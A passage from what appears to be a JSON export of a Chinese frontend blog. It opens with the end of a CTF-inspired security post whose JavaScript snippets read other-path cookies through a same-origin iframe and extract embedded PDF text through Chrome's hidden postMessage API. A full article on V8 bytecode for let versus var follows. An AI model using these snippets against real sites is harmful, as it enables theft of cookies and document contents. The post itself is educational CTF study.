的 cookie，因為 path 不一樣，所以沒辦法拿到。 但其實不一定，如果你的網站沒有阻擋 iframe 嵌入，而且 cookie 又沒有設置 HttpOnly，就可以利用 iframe 來讀取不同 path 的 cookie： // 假設我們在 https://example.com/siteA const iframe = document.createElement('iframe') iframe.src = 'https://example.com/siteB' iframe.onload = () => alert(iframe.contentWindow.document.cookie) &#125; document.body.appendChild(iframe) 這是因為 https://example.com/siteA 跟 https://example.com/siteB 雖然 path 不同，但是是同源的，因此可以直接透過 iframe 來存取同源的其他網頁的 document，就可以利用這個特性拿到 document.cookie 如果沒有支援 iframe，那其實 window.open 也可以達到一樣的效果： const win = window.open('//example.com/siteB') setTimeout(() => &#123; alert(win.document.cookie) &#125;, 1000) 不過要注意的是 window.open 預設會被擋住，要使用者主動允許才能開啟，或者是要使用者做操作以後執行（例如說把上面那段放在 button onclick 裡面）。 而我後來發現其實 RFC 6265 的 section 8.5: Weak Confidentiality 就有提到了（奇怪，以前讀的時候怎麼沒注意到）： Cookies do not always provide isolation by path. Although the network-level protocol does not send cookies stored for one path to another, some user agents expose cookies via non-HTTP APIs, such as HTML’s document.cookie API. Because some of these user agents (e.g., web browsers) do not isolate resources received from different paths, a resource retrieved from one path might be able to access cookies stored for another path. 讀取 PDF 內容假設你的網站上嵌入了一個 same origin 的 pdf 檔案，像這樣： &lt;embed src=\"/test.pdf\"> 這時候你該怎麼用 JS 去讀取這個 pdf 裡面的內容？想必答案一定就是 fetch 或是 xhr 了： fetch(\"/test.pdf\") .then(res => res.blob()) .then(res => &#123; console.log('pdf', res) &#125;) 那如果 fetch 沒辦法用呢？舉例來說，server 在後端擋住來自 fetch 的請求（利用 Fetch Metadata），這時候該怎麼辦呢？有沒有什麼方法可以讀到 PDF 的內容？ 我以前一直覺得不可能有，直到我學到了一個隱藏的 Chrome API： /** @override */ handleScriptingMessage(message) &#123; if (super.handleScriptingMessage(message)) &#123; return true; &#125; if (this.delayScriptingMessage(message)) &#123; return true; &#125; switch (message.data.type.toString()) &#123; case 'getSelectedText': this.pluginController_.getSelectedText().then( this.handleSelectedTextReply.bind(this)); break; case 'getThumbnail': const getThumbnailData = /** @type &#123;GetThumbnailMessageData&#125; */ (message.data); const page = getThumbnailData.page; this.pluginController_.requestThumbnail(page).then( this.sendScriptingMessage.bind(this)); break; case 'print': this.pluginController_.print(); break; case 'selectAll': this.pluginController_.selectAll(); break; default: return false; &#125; return true; &#125; 從這段程式碼裡面可以看出有兩個指令 selectAll 跟 getSelectedText，前者可以全選 PDF 的內容，後者可以拿到選取的文字，因此只要結合這兩個，就能拿到 PDF 裡面的文字內容： // HTML: &lt;embed id=\"f\" onload=\"loaded()\" src=\"...\"> window.addEventListener('message', e => &#123; if (e.data.type === 'getSelectedTextReply') &#123; alert(e.data.selectedText) &#125; &#125;) function loaded() &#123; f.postMessage(&#123;type:'selectAll'&#125;, '*') f.postMessage(&#123;type:'getSelectedText'&#125;, '*') &#125; 一個簡單的 demo 網頁：https://aszx87410.github.io/demo/mw2021/05-pdf/index.html 雖然說這個技巧只能用在文字上面，但這種隱藏的功能真是令人興奮。 結語先補充一下，上述的有些攻擊並不是所有環境都適用，例如說有些攻擊需要網站沒有擋 iframe，而拿來身份驗證的 cookie 可能也不能設定 SameSite，否則就會失效，利用 name 來傳 payload 的方法在某些瀏覽器可能也不適用，但我覺得這都不影響這些攻擊的有趣程度。 文章中有些繞過的部分並沒有寫得很完整，因為我把重點放在「找到至少一種繞過方式」，而不是「寫出所有繞過方式」，想看更完整的繞過技巧可以參考：Cheatsheet: XSS that works in 2021。 這篇文章提到的許多技巧，都是我透過打 CTF 學習而來，例如說下載檔案的 XS leaks 從 LINE CTF 2021 - Your Note，讀取不同 path 的 cookie 是從 DiceCTF 2021 - Web IDE 學到的，Chrome 的隱藏 API 則是在 zer0pts CTF 2021 - PDF Generator 學習到的技巧，透過 CTF 讓我看見了不一樣的 Web。 以上就是我近期學習到的一些與前端相關的知識，每一個都超出了我的想像，希望這篇文章有讓大家感受到我當初的驚訝，覺得：「哇，原來前端還有這些東西，我怎麼都不知道」。","link":"/2021/10/25/learn-frontend-from-security-pov/"},{"title":"從 V8 bytecode 探討 let 與 var 的效能問題","text":"前言在我以前寫過的兩篇文章：我知道你懂 hoisting，可是你了解到多深？以及所有的函式都是閉包：談 JS 中的作用域與 Closure 裡面，都談到了 let 與 var 作用域的不同。 let 的作用域是 block，而 var 則是 fucntion，像這個就是經典案例： for(var i=1; i&lt;=10; i++) &#123; setTimeout(function() &#123; console.log(i) &#125;) &#125; 原本預期會依序輸出 1~10，沒想到卻輸出了 10 個 11。背後原因就是因為第三行那個 i 永遠都只有一個，就是 for 迴圈宣告的那個 var i，從頭到尾都是同一個變數。 而經典解法也很簡單，把 var 改成 let 就搞定了： for(let i=1; i&lt;=10; i++) &#123; setTimeout(function() &#123; console.log(i) &#125;) &#125; 搞定的原因是，可以把上面程式碼看作是下面這種形式： &#123; let i=1 setTimeout(function() &#123; console.log(i) &#125;) &#125; &#123; let i=2 setTimeout(function() &#123; console.log(i) &#125;) &#125; ... &#123; let i=10 setTimeout(function() &#123; console.log(i) &#125;) &#125; 由於 let 的作用域是 block，所以在每一圈迴圈裡面，其實都是一個新的 i，因此迴圈跑 10 圈就有了 10 個不同的 i，最後當然是輸出 10 個不同的數字。 因此 var 跟 let 在這個範例最大的區別就在於變數的數量，前者只有 1 個，後者卻有了 10 個。 好，既然知道了 let 與 var 的差別以後，就可以來看看這篇最主要想討論的問題。 其實這問題是來自於 YDKJS（You Dont Know JS，中譯本翻做：你不知道的JavaScript） 的作者 @getify 在他的推特上所提出的： question for JS engines devs…is there an optimization in place for this kind of code? for (let i = 0; i &lt; 10; i++) &#123; // no closure &#125; IOW, where the behavior of creating a new i per iteration is not needed nor observable… does JS skip doing it? 若是沒有看得很懂，可以繼續看延伸的另外一則推： here’s a variation on the question… will JS engines exhibit much performance difference between these two loops? for (var i = 0; i &lt; 100000000; i++) &#123; // do some stuff, but not closure &#125; for (let i = 0; i &lt; 100000000; i++) &#123; // do the same stuff (no closure) &#125; 簡單來說呢，平常用 let 搭配迴圈的時候，不是如我們上面所說的，每一圈都會有一個新的i嗎？既然是這樣的話，那 var 與 let 應該就會有效能上的差異，因為 let 必須每一圈都 new 一個新的變數出來，所以 let 會比較慢。 那如果迴圈裡面並不需要每一圈都有新的 i，JS 引擎會做優化嗎？這個問題就是這樣，主要是想探討 JS 引擎會不會針對這種行為去做優化。 那要怎麼知道呢？要嘛你是 JS 引擎的開發者，要嘛你去看 JS 引擎的原始碼，但這兩種難度都有點太高。不過別擔心，還有第三種：看 JS bytecode。 JavaScript Bytecode若是不知道 bytecode 是什麼，可以參考這一篇很經典的文章：Understanding V8’s Bytecode，中譯版：理解 V8 的字节码。 先來看文章裡面解釋得最清楚的一張圖片： 在執行 JavaScript 的時候，V8 會先把程式碼編譯成 bytecode，然後再把 bytecode 編譯成 machine code，最後才執行。 舉個現實生活中的範例好了，若是你想把一篇英文文章翻譯成文言文，通常會先把英文文章翻譯成白話文，再從白話文翻譯成文言文。因為直接從英文翻譯成文言文難度過高，先翻成白話文會比較好翻譯；同時，在翻譯成白話文的時候也可以先做一些優化，這樣會比較好翻成文言文。 在這個比喻中，白話文就是我們這篇的主角：bytecode。 在以前寫 C&#x2F;C++ 的時候，若是想知道編譯器會不會針對某一段程式碼做優化，最直接的方法就是輸出編譯過後的 assembly code，從組合語言裡面反推回原本的程式碼，就可以知道編譯器有沒有做事。 而 bytecode 也是一樣的，可以從產生出來的 bytecode 往回推，就知道 V8 有沒有做事情了。 那要怎麼看 V8 產生出來的 bytecode 呢？最簡單的方式就是使用 Node.js 的指令：node --print-bytecode a.js，只要加上--print-bytecode這個 flag 就行了。 但如果你真的去試了，會發現輸出了一大堆東西，這很正常。因為除了你寫的程式碼以外，本來就還有一大堆內建的東西，所以我們可以用--print-bytecode-filter去過濾 function 的名稱。 var 與 let：Round 1我準備的測試程式碼如下： function find_me_let_for()&#123; for (let i = 0; i &lt; 10; i++) &#123; console.log(i) &#125; &#125; function find_me_var_for() &#123; for (var i = 0; i &lt; 10; i++) &#123; console.log(i) &#125; &#125; find_me_let_for() find_me_var_for() 接著就可以用指令：node --print-bytecode --print-bytecode-filter=&quot;find_me*&quot; a.js &gt; byte_code.txt，把結果存到 byte_code.txt 裡面，內容如下： [generated bytecode for function: find_me_let_for] Parameter count 1 Frame size 24 86 E&gt; 0x77191b56622 @ 0 : a0 StackCheck 105 S&gt; 0x77191b56623 @ 1 : 0b LdaZero 0x77191b56624 @ 2 : 26 fb Star r0 110 S&gt; 0x77191b56626 @ 4 : 0c 0a LdaSmi [10] 110 E&gt; 0x77191b56628 @ 6 : 66 fb 00 TestLessThan r0, [0] 0x77191b5662b @ 9 : 94 1c JumpIfFalse [28] (0x77191b56647 @ 37) 92 E&gt; 0x77191b5662d @ 11 : a0 StackCheck 127 S&gt; 0x77191b5662e @ 12 : 13 00 01 LdaGlobal [0], [1] 0x77191b56631 @ 15 : 26 f9 Star r2 135 E&gt; 0x77191b56633 @ 17 : 28 f9 01 03 LdaNamedProperty r2, [1], [3] 0x77191b56637 @ 21 : 26 fa Star r1 135 E&gt; 0x77191b56639 @ 23 : 57 fa f9 fb 05 CallProperty1 r1, r2, r0, [5] 117 S&gt; 0x77191b5663e @ 28 : 25 fb Ldar r0 0x77191b56640 @ 30 : 4a 07 Inc [7] 0x77191b56642 @ 32 : 26 fb Star r0 0x77191b56644 @ 34 : 85 1e 00 JumpLoop [30], [0] (0x77191b56626 @ 4) 0x77191b56647 @ 37 : 0d LdaUndefined 146 S&gt; 0x77191b56648 @ 38 : a4 Return Constant pool (size &#x3D; 2) Handler Table (size &#x3D; 0) 0 1 2 3 4 5 6 7 8 9 [generated bytecode for function: find_me_var_for] Parameter count 1 Frame size 24 173 E&gt; 0x77191b60d0a @ 0 : a0 StackCheck 193 S&gt; 0x77191b60d0b @ 1 : 0b LdaZero 0x77191b60d0c @ 2 : 26 fb Star r0 198 S&gt; 0x77191b60d0e @ 4 : 0c 0a LdaSmi [10] 198 E&gt; 0x77191b60d10 @ 6 : 66 fb 00 TestLessThan r0, [0] 0x77191b60d13 @ 9 : 94 1c JumpIfFalse [28] (0x77191b60d2f @ 37) 180 E&gt; 0x77191b60d15 @ 11 : a0 StackCheck 215 S&gt; 0x77191b60d16 @ 12 : 13 00 01 LdaGlobal [0], [1] 0x77191b60d19 @ 15 : 26 f9 Star r2 223 E&gt; 0x77191b60d1b @ 17 : 28 f9 01 03 LdaNamedProperty r2, [1], [3] 0x77191b60d1f @ 21 : 26 fa Star r1 223 E&gt; 0x77191b60d21 @ 23 : 57 fa f9 fb 05 CallProperty1 r1, r2, r0, [5] 205 S&gt; 0x77191b60d26 @ 28 : 25 fb Ldar r0 0x77191b60d28 @ 30 : 4a 07 Inc [7] 0x77191b60d2a @ 32 : 26 fb Star r0 0x77191b60d2c @ 34 : 85 1e 00 JumpLoop [30], [0] (0x77191b60d0e @ 4) 0x77191b60d2f @ 37 : 0d LdaUndefined 234 S&gt; 0x77191b60d30 @ 38 : a4 Return Constant pool (size &#x3D; 2) Handler Table (size &#x3D; 0) 0 1 2 3 4 5 6 7 8 9 第一行都有標明是哪一個 function，方便我們做辨識：[generated bytecode for function: find_me_let_for]，再來就是實際的 bytecode 了。 在看 bytecode 以前有一個預備知識非常重要，那就是在 bytecode 執行的環境底下，有一個叫做 accumulator 的暫存器。通常指令裡面如果有 a 這個字，就是 accumulator 的簡寫（以下簡稱 acc）。 例如說 bytecode 的第二三行：LdaZero與Star r0，前者就是：LoaD Accumulator Zero，設置 acc register 為 0，接著下一行 Star r0 就是 Store Accumulator to register r0，就是 r0=acc，所以 r0 會變成 0。 我把上面的find_me_let_for 翻成了白話文： StackCheck &#x2F;&#x2F; 檢查 stack LdaZero &#x2F;&#x2F; acc &#x3D; 0 Star r0 &#x2F;&#x2F; r0 &#x3D; acc LdaSmi [10] &#x2F;&#x2F; acc &#x3D; 10 TestLessThan r0, [0] &#x2F;&#x2F; test if r0 &lt; 10 JumpIfFalse [28] &#x2F;&#x2F; if false, jump to line 17 StackCheck &#x2F;&#x2F; 檢查 stack LdaGlobal [0], [1] &#x2F;&#x2F; acc &#x3D; console Star r2 &#x2F;&#x2F; r2 &#x3D; acc LdaNamedProperty r2, [1], [3] &#x2F;&#x2F; acc &#x3D; r2.log Star r1 &#x2F;&#x2F; r1 &#x3D; acc (也就是 console.log) CallProperty1 r1, r2, r0, [5] &#x2F;&#x2F; console.log(r0) Ldar r0 &#x2F;&#x2F; acc &#x3D; r0 Inc [7] &#x2F;&#x2F; acc++ Star r0 &#x2F;&#x2F; r0 &#x3D; acc JumpLoop [30], [0] &#x2F;&#x2F; 跳到 line 4 LdaUndefined &#x2F;&#x2F; acc &#x3D; undefined Return &#x2F;&#x2F; return acc 若是看不習慣這種形式的人，可能是沒有看過組合語言（實際上組合語言比這個難多了就是了…），多看幾次就可以習慣了。 總之呢，上面的程式碼就是一個會一直 log r0 的迴圈，直到 r0&gt;&#x3D;10 為止。而這個 r0 就是我們程式碼裡面的 i。 仔細看的話，會發現 let 跟 var 的版本產生出來的 bytecode 是一模一樣的，從頭到尾都只有一個變數 r0。因此呢，就可以推測出 V8 的確會對這種情形做優化，不會真的每一圈迴圈都新建一個 i，用 let 的時候不需要擔心跟 var 會有效能上的差異。 var 與 let：Round 2再來我們可以試試看「一定需要每一圈新建一個 i」的場合，那就是當裡面有 closure 需要存取 i 的時候。這邊準備的範例程式碼如下： function find_me_let_timeout() &#123; for (let i = 0; i &lt; 10; i++) &#123; setTimeout(function find_me_let_timeout_inner() &#123; console.log(i) &#125;) &#125; &#125; function find_me_var_timeout() &#123; for (var i = 0; i &lt; 10; i++) &#123; setTimeout(function find_me_var_timeout_inner() &#123; console.log(i) &#125;) &#125; &#125; find_me_let_timeout() find_me_var_timeout() 用跟剛剛同樣的指令，一樣可以看到產生出來的 bytecode，我們先來看一下那兩個 inner function 有沒有差別： [generated bytecode for function: find_me_let_timeout_inner] Parameter count 1 Frame size 24 177 E&gt; 0x25d2f37dbb2a @ 0 : a0 StackCheck 188 S&gt; 0x25d2f37dbb2b @ 1 : 13 00 00 LdaGlobal [0], [0] 0x25d2f37dbb2e @ 4 : 26 fa Star r1 196 E&gt; 0x25d2f37dbb30 @ 6 : 28 fa 01 02 LdaNamedProperty r1, [1], [2] 0x25d2f37dbb34 @ 10 : 26 fb Star r0 0x25d2f37dbb36 @ 12 : 1a 04 LdaCurrentContextSlot [4] 200 E&gt; 0x25d2f37dbb38 @ 14 : a5 02 ThrowReferenceErrorIfHole [2] 0x25d2f37dbb3a @ 16 : 26 f9 Star r2 196 E&gt; 0x25d2f37dbb3c @ 18 : 57 fb fa f9 04 CallProperty1 r0, r1, r2, [4] 0x25d2f37dbb41 @ 23 : 0d LdaUndefined 207 S&gt; 0x25d2f37dbb42 @ 24 : a4 Return Constant pool (size &#x3D; 3) Handler Table (size &#x3D; 0) [generated bytecode for function: find_me_var_timeout_inner] Parameter count 1 Frame size 24 332 E&gt; 0x25d2f37e6cf2 @ 0 : a0 StackCheck 343 S&gt; 0x25d2f37e6cf3 @ 1 : 13 00 00 LdaGlobal [0], [0] 0x25d2f37e6cf6 @ 4 : 26 fa Star r1 351 E&gt; 0x25d2f37e6cf8 @ 6 : 28 fa 01 02 LdaNamedProperty r1, [1], [2] 0x25d2f37e6cfc @ 10 : 26 fb Star r0 0x25d2f37e6cfe @ 12 : 1a 04 LdaCurrentContextSlot [4] 0x25d2f37e6d00 @ 14 : 26 f9 Star r2 351 E&gt; 0x25d2f37e6d02 @ 16 : 57 fb fa f9 04 CallProperty1 r0, r1, r2, [4] 0x25d2f37e6d07 @ 21 : 0d LdaUndefined 362 S&gt; 0x25d2f37e6d08 @ 22 : a4 Return Constant pool (size &#x3D; 2) Handler Table (size &#x3D; 0) 可以看到唯一的差別是 let 的版本多了一個：ThrowReferenceErrorIfHole，這一個在我知道你懂 hoisting，可是你了解到多深？裡面有提過，其實就是 TDZ（Temporal Dead Zone）在 V8 上的實作。 最後就是我們的主菜了，先從 var 開始看吧： [generated bytecode for function: find_me_var_timeout] Parameter count 1 Frame size 24 0x25d2f37d8d22 @ 0 : 7f 00 01 CreateFunctionContext [0], [1] 0x25d2f37d8d25 @ 3 : 16 fb PushContext r0 245 E&gt; 0x25d2f37d8d27 @ 5 : a0 StackCheck 265 S&gt; 0x25d2f37d8d28 @ 6 : 0b LdaZero 265 E&gt; 0x25d2f37d8d29 @ 7 : 1d 04 StaCurrentContextSlot [4] 270 S&gt; 0x25d2f37d8d2b @ 9 : 1a 04 LdaCurrentContextSlot [4] 0x25d2f37d8d2d @ 11 : 26 fa Star r1 0x25d2f37d8d2f @ 13 : 0c 0a LdaSmi [10] 270 E&gt; 0x25d2f37d8d31 @ 15 : 66 fa 00 TestLessThan r1, [0] 0x25d2f37d8d34 @ 18 : 94 1b JumpIfFalse [27] (0x25d2f37d8d4f @ 45) 252 E&gt; 0x25d2f37d8d36 @ 20 : a0 StackCheck 287 S&gt; 0x25d2f37d8d37 @ 21 : 13 01 01 LdaGlobal [1], [1] 0x25d2f37d8d3a @ 24 : 26 fa Star r1 0x25d2f37d8d3c @ 26 : 7c 02 03 02 CreateClosure [2], [3], #2 0x25d2f37d8d40 @ 30 : 26 f9 Star r2 287 E&gt; 0x25d2f37d8d42 @ 32 : 5b fa f9 04 CallUndefinedReceiver1 r1, r2, [4] 277 S&gt; 0x25d2f37d8d46 @ 36 : 1a 04 LdaCurrentContextSlot [4] 0x25d2f37d8d48 @ 38 : 4a 06 Inc [6] 277 E&gt; 0x25d2f37d8d4a @ 40 : 1d 04 StaCurrentContextSlot [4] 0x25d2f37d8d4c @ 42 : 85 21 00 JumpLoop [33], [0] (0x25d2f37d8d2b @ 9) 0x25d2f37d8d4f @ 45 : 0d LdaUndefined 369 S&gt; 0x25d2f37d8d50 @ 46 : a4 Return Constant pool (size &#x3D; 3) Handler Table (size &#x3D; 0) 在開頭的時候就先用CreateFunctionContext新建了一個 function context，接著可以看到存取變數的方式也與之前單純用暫存器不同，這邊用的是：StaCurrentContextSlot跟LdaCurrentContextSlot，碰到看不懂的指令都可以去 &#x2F;src&#x2F;interpreter&#x2F;interpreter-generator.cc 查一下定義： // StaCurrentContextSlot &lt;slot_index> // // Stores the object in the accumulator into |slot_index| of the current // context. IGNITION_HANDLER(StaCurrentContextSlot, InterpreterAssembler) &#123; Node* value = GetAccumulator(); Node* slot_index = BytecodeOperandIdx(0); Node* slot_context = GetContext(); StoreContextElement(slot_context, slot_index, value); Dispatch(); &#125; // LdaCurrentContextSlot &lt;slot_index> // // Load the object in |slot_index| of the current context into the accumulator. IGNITION_HANDLER(LdaCurrentContextSlot, InterpreterAssembler) &#123; Node* slot_index = BytecodeOperandIdx(0); Node* slot_context = GetContext(); Node* result = LoadContextElement(slot_context, slot_index); SetAccumulator(result); Dispatch(); &#125; 簡單來說呢，StaCurrentContextSlot 就是把 acc 的東西存到現在的 context 的某個 slot_index，而 LdaCurrentContextSlot 則是相反，把東西取出來放到 acc 去。 因此可以先看開頭這幾行： LdaZero StaCurrentContextSlot [4] LdaCurrentContextSlot [4] Star r1 LdaSmi [10] TestLessThan r1, [0] JumpIfFalse [27] (0x25d2f37d8d4f @ 45) 就是把 0 放到 current context 的 slot_index 4 裡面去，接著再拿去放到 r1，然後再去跟 10 比較。這一段其實就是 for 迴圈裡面的 i&lt;10。 而後半段的： LdaCurrentContextSlot [4] Inc [6] StaCurrentContextSlot [4] 其實就是 i++。 所以 i 會存在 current context slot 的 index 為 4 的位置。再來我們回顧一下前面所說的 inner function： [generated bytecode for function: find_me_var_timeout_inner] Parameter count 1 Frame size 24 332 E&gt; 0x25d2f37e6cf2 @ 0 : a0 StackCheck 343 S&gt; 0x25d2f37e6cf3 @ 1 : 13 00 00 LdaGlobal [0], [0] 0x25d2f37e6cf6 @ 4 : 26 fa Star r1 351 E&gt; 0x25d2f37e6cf8 @ 6 : 28 fa 01 02 LdaNamedProperty r1, [1], [2] 0x25d2f37e6cfc @ 10 : 26 fb Star r0 0x25d2f37e6cfe @ 12 : 1a 04 LdaCurrentContextSlot [4] 0x25d2f37e6d00 @ 14 : 26 f9 Star r2 351 E&gt; 0x25d2f37e6d02 @ 16 : 57 fb fa f9 04 CallProperty1 r0, r1, r2, [4] 0x25d2f37e6d07 @ 21 : 0d LdaUndefined 362 S&gt; 0x25d2f37e6d08 @ 22 : a4 Return Constant pool (size &#x3D; 2) Handler Table (size &#x3D; 0) 有沒有注意到 LdaCurrentContextSlot [4] 這一行？這一行就呼應了我們上面所說的，在 inner function 用這一行把 i 給拿出來。 所以在 var 的範例裡面，開頭就會先新增一個 function context，然後從頭到尾都只有這一個 context，會把 i 放在裡面 slot index 為 4 的位置，而 inner function 也會從這個位置把 i 拿出來。 因此從頭到尾 i 都只有一個。 最後來看看複雜許多的 let 的版本： [generated bytecode for function: find_me_let_timeout] Parameter count 1 Register count 7 Frame size 56 179 E&gt; 0x2725c3d70daa @ 0 : a5 StackCheck 199 S&gt; 0x2725c3d70dab @ 1 : 0b LdaZero 0x2725c3d70dac @ 2 : 26 f8 Star r3 0x2725c3d70dae @ 4 : 26 fb Star r0 0x2725c3d70db0 @ 6 : 0c 01 LdaSmi [1] 0x2725c3d70db2 @ 8 : 26 fa Star r1 293 E&gt; 0x2725c3d70db4 @ 10 : a5 StackCheck 0x2725c3d70db5 @ 11 : 82 00 CreateBlockContext [0] 0x2725c3d70db7 @ 13 : 16 f7 PushContext r4 0x2725c3d70db9 @ 15 : 0f LdaTheHole 0x2725c3d70dba @ 16 : 1d 04 StaCurrentContextSlot [4] 0x2725c3d70dbc @ 18 : 25 fb Ldar r0 0x2725c3d70dbe @ 20 : 1d 04 StaCurrentContextSlot [4] 0x2725c3d70dc0 @ 22 : 0c 01 LdaSmi [1] 0x2725c3d70dc2 @ 24 : 67 fa 00 TestEqual r1, [0] 0x2725c3d70dc5 @ 27 : 99 07 JumpIfFalse [7] (0x2725c3d70dcc @ 34) 0x2725c3d70dc7 @ 29 : 0b LdaZero 0x2725c3d70dc8 @ 30 : 26 fa Star r1 0x2725c3d70dca @ 32 : 8b 08 Jump [8] (0x2725c3d70dd2 @ 40) 211 S&gt; 0x2725c3d70dcc @ 34 : 1a 04 LdaCurrentContextSlot [4] 0x2725c3d70dce @ 36 : 4c 01 Inc [1] 211 E&gt; 0x2725c3d70dd0 @ 38 : 1d 04 StaCurrentContextSlot [4] 0x2725c3d70dd2 @ 40 : 0c 01 LdaSmi [1] 0x2725c3d70dd4 @ 42 : 26 f9 Star r2 204 S&gt; 0x2725c3d70dd6 @ 44 : 1a 04 LdaCurrentContextSlot [4] 0x2725c3d70dd8 @ 46 : 26 f6 Star r5 0x2725c3d70dda @ 48 : 0c 0a LdaSmi [10] 204 E&gt; 0x2725c3d70ddc @ 50 : 69 f6 02 TestLessThan r5, [2] 0x2725c3d70ddf @ 53 : 99 04 JumpIfFalse [4] (0x2725c3d70de3 @ 57) 0x2725c3d70de1 @ 55 : 8b 06 Jump [6] (0x2725c3d70de7 @ 61) 0x2725c3d70de3 @ 57 : 17 f7 PopContext r4 0x2725c3d70de5 @ 59 : 8b 33 Jump [51] (0x2725c3d70e18 @ 110) 0x2725c3d70de7 @ 61 : 0c 01 LdaSmi [1] 0x2725c3d70de9 @ 63 : 67 f9 03 TestEqual r2, [3] 0x2725c3d70dec @ 66 : 99 1c JumpIfFalse [28] (0x2725c3d70e08 @ 94) 186 E&gt; 0x2725c3d70dee @ 68 : a5 StackCheck 221 S&gt; 0x2725c3d70def @ 69 : 13 01 04 LdaGlobal [1], [4] 0x2725c3d70df2 @ 72 : 26 f6 Star r5 0x2725c3d70df4 @ 74 : 81 02 06 02 CreateClosure [2], [6], #2 0x2725c3d70df8 @ 78 : 26 f5 Star r6 221 E&gt; 0x2725c3d70dfa @ 80 : 5d f6 f5 07 CallUndefinedReceiver1 r5, r6, [7] 0x2725c3d70dfe @ 84 : 0b LdaZero 0x2725c3d70dff @ 85 : 26 f9 Star r2 0x2725c3d70e01 @ 87 : 1a 04 LdaCurrentContextSlot [4] 0x2725c3d70e03 @ 89 : 26 fb Star r0 0x2725c3d70e05 @ 91 : 8a 1e 01 JumpLoop [30], [1] (0x2725c3d70de7 @ 61) 0x2725c3d70e08 @ 94 : 0c 01 LdaSmi [1] 293 E&gt; 0x2725c3d70e0a @ 96 : 67 f9 09 TestEqual r2, [9] 0x2725c3d70e0d @ 99 : 99 06 JumpIfFalse [6] (0x2725c3d70e13 @ 105) 0x2725c3d70e0f @ 101 : 17 f7 PopContext r4 0x2725c3d70e11 @ 103 : 8b 07 Jump [7] (0x2725c3d70e18 @ 110) 0x2725c3d70e13 @ 105 : 17 f7 PopContext r4 0x2725c3d70e15 @ 107 : 8a 61 00 JumpLoop [97], [0] (0x2725c3d70db4 @ 10) 0x2725c3d70e18 @ 110 : 0d LdaUndefined 295 S&gt; 0x2725c3d70e19 @ 111 : a9 Return Constant pool (size &#x3D; 3) Handler Table (size &#x3D; 0) 因為這程式碼有點太長而且不容易閱讀，所以我刪改了一下，改寫了一個比較白話的版本： r1 = 1 r0 = 0 loop: r4.push(new BlockContext()) CurrentContextSlot = r0 if (r1 === 1) &#123; r1 = 0 &#125; else &#123; CurrentContextSlot++ &#125; r2 = 1 r5 = CurrentContextSlot if (!(r5 &lt; 10)) &#123; // end loop PopContext r4 goto done &#125; loop2: if (r2 === 1) &#123; setTimeout() r2 = 0 r0 = CurrentContextSlot goto loop2 &#125; if (r2 === 1) &#123; PopContext r4 goto done &#125; PopContext r4 goto loop done: return undefined 第一個重點是每一圈迴圈都會呼叫CreateBlockContext，新建一個 context，然後再迴圈結束前把 CurrentContextSlot（也就是 i）的值存到 r0，下一圈迴圈時再讓新的 block context slot 的值從 r0 讀取出來然後 +1，藉此來實作不同 context 值的累加。 然後你可能會很好奇，那這個 block context 到底會用在哪裡？ 上面的 bytecode 裡面，呼叫 setTimeout 的是這一段： LdaGlobal [1], [4] Star r5 &#x2F;&#x2F; r5 &#x3D; setTimeout CreateClosure [2], [6], #2 Star r6 &#x2F;&#x2F; r6 &#x3D; new function(...) CallUndefinedReceiver1 r5, r6, [7] &#x2F;&#x2F; setTimeout(r6) 在我們呼叫CreateClosure把這個 closure 傳給 setTimeout 的時候，就一起傳進去了（非完整程式碼，只保留 context 的部分）： // CreateClosure &lt;index> &lt;slot> &lt;tenured> // // Creates a new closure for SharedFunctionInfo at position |index| in the // constant pool and with the PretenureFlag &lt;tenured>. IGNITION_HANDLER(CreateClosure, InterpreterAssembler) &#123; Node* context = GetContext(); Node* result = CallRuntime(Runtime::kNewClosure, context, shared, feedback_cell); SetAccumulator(result); Dispatch(); &#125; 因此，在 inner function 裡面呼叫 LdaCurrentContextSlot 的時候，就會載入到正確的 context 以及正確的 i。 結論： var 的版本是 CreateFunctionContext，從頭到尾就一個 context let 的版本每一圈迴圈都會 CreateBlockContext，總共會有 10 個 context 在不需要 closure 的場合裡，let 與 var 在 V8 上並沒有差異 總結有些你以為答案「顯而易見」的問題，其實並不一定。 例如說以下這個範例： function v1() &#123; var a = 1 for(var i=1;i&lt;10; i++)&#123; var a = 1 &#125; &#125; function v2() &#123; var a = 1 for(var i=1; i&lt;10; i++) &#123; a = 1 &#125; &#125; v1 跟 v2 哪一個比較快？ 「v1 裡面每一圈迴圈都會重新宣告一次 a 並且賦值，v2 只會在外面宣告一次，裡面迴圈只有賦值而已，所以 v1 比較快」 答案是兩個一模一樣，因為如果你夠瞭解 JS，就會知道根本沒有什麼「重新宣告」這種事，宣告早在編譯階段就被處理掉了。 就算效能真的有差，可是到底差多少？是值得我們投注心力在上面的差異嗎？ 例如說在寫 React 的時候，常常被教導要避免掉 inline function： // Good render() &#123; &lt;div onClick=&#123;this.onClick&#125; /> &#125; // Bad render() &#123; &lt;div onClick=&#123;() => &#123; /* do something */ &#125;&#125; /> &#125; 用頭腦想一想十分合理，下面那個每跑一次 render 就會產生一個新的 function，上面那個則是永遠都共用同一個。儘管他們的確有效能上的差異，但這個差異或許比你想的還要小。 再舉最後一個例子： // A var obj = &#123;a:1, b:2, ...&#125; // 非常大的 object // B var obj = JSON.parse('&#123;\"a\": 1, \"b\": 2, ...&#125;') // JSON.parse 搭配很長的字串 若是 A 跟 B 都表示同一個很大的物件，哪一個會比較快？ 以直覺來看，顯然是 A，因為 B 看起來就是多此一舉，先把 object 變成字串然後再丟給 JSON.parse，多了一個步驟。但事實上，B 比較快，而且快了 1.5 倍以上。 很多東西以直覺來看是一回事，實際上又是另外一回事。因為直覺歸直覺，但是底層牽涉到了 compiler 或甚至是作業系統幫你做的優化，把這些考慮進來的話，很可能又是另外一回事。 就如同這篇文章裡面在探討的題目，以直覺來看 let 是會比 var 還要慢的。但事實證明了在不需要用到 closure 的場合裡面，兩者並沒有差異。 針對這些問題，你當然可以猜測，但你要知道的是這些僅僅只是猜測。想知道正確答案為何，必須要有更科學的方法，而不只是「我覺得」。","link":"/2020/02/20/let-vs-var-bytecode/"},{"title":"幕後花絮：Lidemy HTTP Challenge 的設計以及彩蛋","text":"前言前陣子我為了幫自己的學生們更熟悉 HTTP 以及 API 的串接，寫出了一個小遊戲：Lidemy HTTP Challenge，需要根據每一關的說明取得正確的 token，一共有十五關，前十關基本，後五關進階。 經過了一些朋友的測試之後，慢慢調整、改善，最後讓學生測試發現反應都不錯，於是就在前端社群正式對外公開這個遊戲，讓大家也能一起參與。 